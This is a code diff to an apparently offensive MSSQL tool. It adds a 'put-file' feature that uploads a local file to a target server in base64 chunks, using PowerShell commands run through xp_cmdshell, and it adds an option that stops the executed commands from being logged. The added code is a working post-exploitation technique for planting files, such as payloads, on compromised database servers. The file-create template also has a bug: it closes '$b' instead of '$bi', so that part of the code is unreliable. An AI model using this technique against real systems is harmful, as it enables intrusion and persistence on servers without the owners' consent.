@@ -3,8 +3,9 @@
 
 import logging
 from Mssql import Mssql
-from Utils import cleanString, ErrorClass,checkOptionsGivenByTheUser, ErrorClass
+from Utils import cleanString, ErrorClass,checkOptionsGivenByTheUser, ErrorClass, getBinaryDataFromFile
 from Constants import *
+import base64
 
 class Xpcmdshell (Mssql):
 	'''
@@ -103,13 +104,14 @@ class Xpcmdshell (Mssql):
 		logging.info("The xp_cmdshell stored procedure has been rebuilt")
 	"""
 		
-	def executeCmd (self,cmd=None, printResponse=True):
+	def executeCmd (self,cmd=None, printResponse=True, printCMD=True):
 		'''
 		Execute a command
 		Return error if error
 		Otherwise return output data
 		'''
-		logging.info("Executing the '{0}' system command on the {1} server...".format(cmd, self.host))
+		if printCMD==True:
+			logging.info("Executing the '{0}' system command on the {1} server...".format(cmd, self.host))
 		data = self.executeRequest(self.REQ_XPCMDSHELL_CMD.format(cmd),ld=['output'])
 		if isinstance(data,Exception): return data
 		else: 
@@ -167,6 +169,44 @@ class Xpcmdshell (Mssql):
 				return True
 		return False
 		
+	def uploadFileWithPowershell(self, localFilePath, remoteFilePath, width=5000):
+		'''
+		Copy content of localFilePath into remoteFilePath on the target.
+		'''
+		PS_CMD_WRITE_CREATE = """	powershell -c 
+									$By=[System.Convert]::FromBase64String(''{1}'');
+									$fi=New-Object System.IO.FileStream(''{0}'',''Create'');
+									$bi=New-Object System.IO.BinaryWriter($fi);
+									$bi.write($By);
+									$b.Close();
+		"""
+		PS_CMD_WRITE_APPEND ="""powershell -c 
+								$By=[System.Convert]::FromBase64String(''{1}'');
+								$fi=New-Object System.IO.FileStream(''{0}'',''Append'',''Write'');
+								$bi=New-Object System.IO.BinaryWriter($fi);
+								$bi.write($By);
+								$bi.Close();
+		"""
+		logging.info("Uploading {0} on the target in {1} with powershell commands".format(localFilePath, remoteFilePath))
+		rawData = getBinaryDataFromFile(localFilePath)
+		rawDataSplitted = [rawData[i:i + width] for i in range(0, len(rawData), width)]
+		rawDataSplittedSize = len(rawDataSplitted)
+		logging.info("{0} powershell command(s) will be executed on the target for creating the file".format(rawDataSplittedSize))
+		for i, aRawData in enumerate(rawDataSplitted):
+			if i == 0:
+				#we create the file with powershell
+				cmd = PS_CMD_WRITE_CREATE.format(remoteFilePath, base64.b64encode(aRawData)).replace('\t','').replace('\n','')
+				status = self.executeCmd (cmd=cmd, printResponse=False, printCMD=False)
+				if isinstance(status,Exception): return status
+			else:
+				#we append data to file
+				cmd = PS_CMD_WRITE_APPEND.format(remoteFilePath, base64.b64encode(aRawData)).replace('\t','').replace('\n','')
+				status = self.executeCmd (cmd=cmd, printResponse=False, printCMD=False)
+				if isinstance(status,Exception): return status
+			logging.info("{0}/{1} done".format(i+1,rawDataSplittedSize))
+		logging.info("Upload finished")
+		return True
+		
 	def testAll (self):
 		'''
 		Test all functions
@@ -191,10 +231,17 @@ def runXpCmdShellModule(args):
 	Run the XpCmdShell module
 	'''
 	noErrorWithEnableXpcmdshell = True
-	if checkOptionsGivenByTheUser(args,["test-module","shell","enable-xpcmdshell","disable-xpcmdshell"],checkAccount=True) == False : return EXIT_MISS_ARGUMENT
+	if checkOptionsGivenByTheUser(args,["test-module","shell","enable-xpcmdshell","disable-xpcmdshell","put-file"],checkAccount=True) == False : return EXIT_MISS_ARGUMENT
 	xpcmdshell = Xpcmdshell(args)
 	xpcmdshell.connect()
 	if args["test-module"] == True: xpcmdshell.testAll()
+	if args["put-file"] != None:
+		args['print'].title("Try to copy the local file {0} to {1} with powershell".format(args['put-file'][0],args['put-file'][1]))
+		data = xpcmdshell.uploadFileWithPowershell(args['put-file'][0],args['put-file'][1], width=int(args['put-file'][2]))
+		if data == True:
+			args['print'].goodNews("The local file {0} has been copied in {1}".format(args['put-file'][0],args['put-file'][1]))
+		else:
+			args['print'].badNews("Impossible to put the local file {0} to {1}: '{2}'".format(args['put-file'][0],args['put-file'][1],data))
 	if args["enable-xpcmdshell"] == True:
 		args['print'].title("Re-enable Xpcmdshell")
 		noErrorWithEnableXpcmdshell = xpcmdshell.enableXpcmdshell()
